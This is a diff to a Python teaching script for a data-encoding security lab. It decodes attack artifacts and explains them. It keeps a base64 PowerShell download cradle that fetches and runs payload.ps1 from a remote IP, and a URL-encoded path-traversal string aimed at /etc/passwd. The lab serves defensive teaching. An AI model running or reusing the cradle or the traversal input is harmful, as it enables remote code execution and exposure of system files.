@@ -26,7 +26,7 @@ DIVIDER = "─" * 64
 # Bundled artifacts (duplicated here so demo runs without reading the file)
 PS_B64 = ("aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
           "Oi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==")
-HEX_C2 = "633263726561747075642e6d6572696469616e74657374"
+HEX_C2 = "63646e2d7570646174652e6578616d706c65"  # decodes to cdn-update.example
 URL_TRAV = "%2F..%2F..%2F..%2Fetc%2Fpasswd"
 
 
@@ -38,7 +38,7 @@ def section(title: str) -> None:
 
 def demo_b64_mechanics() -> None:
     section("1 — Base64 mechanics: encode → decode round-trip")
-    msg = "Meridian Financial"
+    msg = "encoding is not encryption"
     encoded = __import__("base64").b64encode(msg.encode()).decode()
     decoded = __import__("base64").b64decode(encoded).decode()
     print(f"\n  Original:  {msg!r}")
@@ -79,8 +79,9 @@ def demo_ps_artifact() -> None:
     print(f"    {defanged}")
     print()
     print("  What it does: IEX = Invoke-Expression — runs code downloaded from the URL.")
-    print("  This is a 'download cradle' (T1059.001 + T1105).")
-    print("  The URL resolves to the Meridian Financial C2 seen in Track 01/02 labs.")
+    print("  This is a 'download cradle' (T1059.001 + T1105) — the Emotet-style")
+    print("  `powershell.exe -enc <base64>` loader pattern. The decoded URL is the")
+    print("  stage-2 download location (defanged above; never fetch it).")
     print()
     print("  CLI equivalent:")
     print(f"    echo '{PS_B64}' | base64 -d | iconv -f utf-16le -t utf-8")
@@ -162,7 +163,7 @@ def demo_kev_jq() -> None:
 
 def main() -> None:
     print("=" * 64)
-    print("Meridian Financial — Data Encoding Lab Demo")
+    print("Data Encoding Lab Demo — peel real artifacts, never run them")
     print("=" * 64)
     print()
     print("This lab decodes real-shaped artifacts — the kind found in")
